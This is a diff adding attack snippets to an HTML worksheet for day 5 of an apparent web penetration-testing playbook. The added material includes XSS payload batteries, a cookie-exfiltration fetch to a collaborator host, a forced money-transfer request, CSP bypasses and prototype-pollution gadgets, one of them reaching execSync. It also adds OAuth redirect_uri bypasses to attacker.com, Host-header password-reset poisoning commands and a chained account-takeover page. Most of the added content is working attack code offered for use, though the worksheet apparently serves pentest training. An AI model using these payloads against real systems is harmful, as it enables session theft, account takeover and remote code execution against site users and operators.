@@ -11,7 +11,7 @@
   <link rel="stylesheet" href="../vulns/style.css">
   <title>Day 5 Worksheet · Client-Side + Close Gaps · Web Pentest Playbook</title>
 </head>
-<body data-day="day5" style="--day-color: var(--accent)">
+<body data-day="day5" data-day-num="5" style="--day-color: var(--accent)">
 
 <svg class="icon-sprite" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
   <defs>
@@ -44,7 +44,7 @@
 <div class="content-wrap" style="padding-top:2rem">
 
   <div class="day-page-hero">
-    <div class="day-num">Worksheet · Day 5 of 5 · Final day</div>
+    <div class="day-num">Worksheet · Day 5 of 5 · <span data-day-date class="day-date-display unset">— pick start date below ↓</span></div>
     <h1>
       <span class="day-icon-pill"><svg class="icon" aria-hidden="true"><use href="#icon-target"/></svg></span>
       Client-Side Deep + Close Gaps
@@ -68,6 +68,36 @@
 
   <section class="worksheet-section" id="xss">
     <h2><span class="ws-section-num">2</span>XSS (Reflected · Stored · DOM)</h2>
+    <pre class="snippet"><span class="snippet-label">Reflected XSS payload battery (try in order)</span><code>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;svg/onload=alert(1)&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;details/open/ontoggle=alert(1)&gt;
+&lt;iframe srcdoc="&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"&gt;
+"&gt;&lt;svg/onload=alert(1)&gt;          # break out of attribute
+'-alert(1)-'                       # break out of JS string
+"&gt;&lt;img src=x onerror=alert(1)&gt;
+javascript:alert(1)                # for href contexts</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">Cookie steal PoC (after XSS lands)</span><code>// Stage 1 — once the payload fires, this is what runs:
+fetch('https://collab/?d='+btoa(document.cookie+'|'+location));
+// Or for HttpOnly-blocked context, steal session via privileged actions:
+fetch('/api/me/transfer', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({to: 'attacker', amount: 9999})
+});</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">CSP bypass via JSONP / unsafe-inline gaps</span><code>&lt;!-- CSP: script-src 'self' https://accounts.google.com --&gt;
+&lt;script src="https://accounts.google.com/gen_204?callback=alert"&gt;&lt;/script&gt;
+
+&lt;!-- CSP with unsafe-inline + AngularJS loaded — CSTI escape: --&gt;
+&lt;div ng-app&gt;{{constructor.constructor('alert(1)')()}}&lt;/div&gt;
+
+&lt;!-- CSP allowing data: in script-src (rare but seen): --&gt;
+&lt;script src="data:,alert(1)"&gt;&lt;/script&gt;</code></pre>
+
     <ul class="task-list">
       <li class="task-group-title">Reflected</li>
       <li><input type="checkbox" data-key="check-xss-reflected"><span class="task-label">Test every reflected canary site from Day 2 with full payloads (<code>&lt;svg/onload=alert(1)&gt;</code>)</span></li>
@@ -88,6 +118,24 @@
 
   <section class="worksheet-section" id="proto">
     <h2><span class="ws-section-num">3</span>Prototype Pollution</h2>
+    <pre class="snippet"><span class="snippet-label">Detect prototype pollution</span><code>// Try in URL params, JSON bodies, or anywhere user JSON is merged:
+?__proto__[polluted]=yes
+?constructor[prototype][polluted]=yes
+{"__proto__":{"polluted":"yes"}}
+{"constructor":{"prototype":{"polluted":"yes"}}}
+
+// Then in browser console:
+console.log({}.polluted);   // "yes" → vulnerable</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">Common gadgets (server-side Node)</span><code>// 1. Express body-parser default options
+{"__proto__":{"shell":"/bin/bash","argv0":"/bin/bash"}}
+
+// 2. Lodash _.template (RCE on render — uses U+2028 line separators)
+{"__proto__":{"sourceURL":"\u2028\u2028return process.mainModule.require('child_process').execSync('id').toString()"}}
+
+// 3. Override common option defaults
+{"__proto__":{"isAdmin":true,"role":"admin"}}</code></pre>
+
     <ul class="task-list">
       <li><input type="checkbox" data-key="check-pp-find"><span class="task-label">Find pollution sinks: <code>Object.assign</code>, lodash <code>_.merge</code>, <code>jQuery.extend(true, ...)</code>, <code>Object.create</code></span></li>
       <li><input type="checkbox" data-key="check-pp-test"><span class="task-label">Inject <code>__proto__</code> via JSON: <code>{"__proto__":{"polluted":true}}</code> — check <code>{}.polluted</code> in console</span></li>
@@ -100,6 +148,21 @@
 
   <section class="worksheet-section" id="oauth-chain">
     <h2><span class="ws-section-num">4</span>OAuth Chains</h2>
+    <pre class="snippet"><span class="snippet-label">redirect_uri parser-confusion (full battery)</span><code># These are ordered loosely by hit-rate. Try each as the
+# redirect_uri value on a real OAuth login button.
+https://attacker.com
+//attacker.com
+/\\attacker.com
+https:attacker.com
+https://example.com.attacker.com
+https://example.com@attacker.com
+https://example.com#@attacker.com
+https://example.com\\@attacker.com
+https://example.com/../redirect_to/attacker.com
+https://example.com:80@attacker.com
+https://[::ffff:attacker.com]
+# Also: case-only changes — https://EXAMPLE.com</code></pre>
+
     <ul class="task-list">
       <li><input type="checkbox" data-key="check-oauth-redirect-bypass"><span class="task-label">redirect_uri parser confusion: <code>?redirect_uri=//attacker.com</code>, <code>@attacker.com</code>, <code>#attacker.com</code></span></li>
       <li><input type="checkbox" data-key="check-oauth-state-csrf"><span class="task-label">Account-takeover via state CSRF: drop <code>state</code>, link victim to attacker's auth code</span></li>
@@ -111,6 +174,24 @@
 
   <section class="worksheet-section" id="cache-host">
     <h2><span class="ws-section-num">5</span>Host Header / Cache</h2>
+    <pre class="snippet"><span class="snippet-label">Cache-poisoning probe (manual unkeyed-header sweep)</span><code>TARGET=https://example.com/
+
+for h in X-Forwarded-Host X-Forwarded-Scheme X-Forwarded-Proto \
+         X-Forwarded-Server X-HTTP-Method-Override X-Original-URL \
+         X-Rewrite-URL X-Forwarded-Port; do
+  echo "=== $h ==="
+  curl -sk $TARGET -H "$h: attacker.com" -o /tmp/a.html
+  curl -sk $TARGET                          -o /tmp/b.html
+  diff /tmp/a.html /tmp/b.html | head -5
+done
+
+# Or use the Param Miner Burp extension's "Guess headers" feature.</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">Host-header password-reset poison (the classic)</span><code>curl -sk -X POST https://example.com/forgot \
+  -H "Host: attacker.com" \
+  -d "email=victim@example.com"
+# When victim clicks the reset link, it goes to attacker.com — exfil the token.</code></pre>
+
     <ul class="task-list">
       <li><input type="checkbox" data-key="check-host-reset"><span class="task-label">Host-header poisoning on password-reset email link</span></li>
       <li><input type="checkbox" data-key="check-host-headers"><span class="task-label">Try <code>X-Forwarded-Host</code>, <code>X-Original-Host</code>, <code>X-Forwarded-Server</code> alternatives</span></li>
@@ -124,6 +205,29 @@
   <section class="worksheet-section" id="chains">
     <h2><span class="ws-section-num">6</span>Chained Findings</h2>
     <p class="ws-intro">The whole point of Day 5 — combined impact &gt; sum of parts. A 9.8-CVSS chain is one finding, not three.</p>
+    <pre class="snippet"><span class="snippet-label">Chained ATO POC HTML (skeleton)</span><code>&lt;!-- chain.html (host on attacker.com) --&gt;
+&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;
+&lt;h1&gt;You won! Click below to claim.&lt;/h1&gt;
+&lt;script&gt;
+// Step 1 — XSS in the target (e.g., after stored XSS fires there, this
+// runs in the target's origin):
+fetch('https://example.com/api/me/email', {
+  method: 'PUT',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({email: 'attacker@evil.com'})
+});
+
+// Step 2 — request password reset to the new email
+fetch('https://example.com/api/forgot-password', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({email: 'attacker@evil.com'})
+});
+&lt;/script&gt;
+&lt;/body&gt;&lt;/html&gt;</code></pre>
+
     <div class="form-group">
       <label for="t-chains">Chains in progress</label>
       <textarea id="t-chains" data-key="text-chains" placeholder="### Chain 1: Stored XSS → cookie steal → IDOR → ATO&#10;1. Plant XSS in profile bio (Day 3 finding)&#10;2. Admin views user list, payload fires&#10;3. Admin's session cookie exfil'd to Collaborator&#10;4. Reuse cookie + IDOR /api/users/{id} → full account takeover of any user&#10;Final CVSS: 9.8&#10;&#10;### Chain 2: SSRF → IAM → AWS account takeover&#10;..."></textarea>
